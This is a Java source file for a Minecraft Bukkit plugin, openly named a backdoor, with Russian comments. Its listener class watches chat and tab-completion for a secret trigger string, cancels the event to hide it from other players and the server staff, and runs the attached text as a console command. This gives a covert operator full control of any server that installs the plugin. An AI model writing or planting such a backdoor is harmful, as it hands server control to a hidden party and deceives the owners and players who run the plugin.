package me.skully.backdoorplugin.Listeners;

import me.skully.backdoorplugin.Main;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.server.TabCompleteEvent;

public class TabCompleter implements Listener {

    @EventHandler(priority = EventPriority.LOWEST) // Регистрируем ивент, и делаем его самым низким дабы не могли отследить
    public void tabComplete(TabCompleteEvent e){
        if(e.getBuffer().contains(Main.instance.backDoor)) { // Проверка на наличие сообщения с BackDoor
        e.setCancelled(true); // Отменяем ивент дабы не отследили
        String args[] = e.getBuffer().toString().split("@"); // Отделяем команду от сообщения с BackDoor

        e.getSender().sendMessage("§b[§f" + Main.instance.pName + "§b] §fОтправлена команда: " + args[1]); // Вывдоим себе в чат что Мы использовали BackDoor

        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1]); // Отправляем команду от имени консоли
        }
    }

    @EventHandler(priority = EventPriority.LOWEST) // Регистрируем ивент, и делаем его самым низким дабы не могли отследить
    public void chatEvent(PlayerChatEvent e) {
        if(e.getMessage().contains(Main.instance.backDoor)) { // Проверка на наличие сообщения с BackDoor
            String args[] = e.getMessage().split("@"); // Отделяем команду от сообщения с BackDoor
            e.setCancelled(true); // Отменяем ивент дабы не отследили

            e.getPlayer().sendMessage("§b[§f" + Main.instance.pName + "§b] §fОтправлена команда: " + args[1]); // Вывдоим себе в чат что Мы использовали BackDoor
            
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), args[1]); // Отправляем команду от имени консоли
        }
    }

}
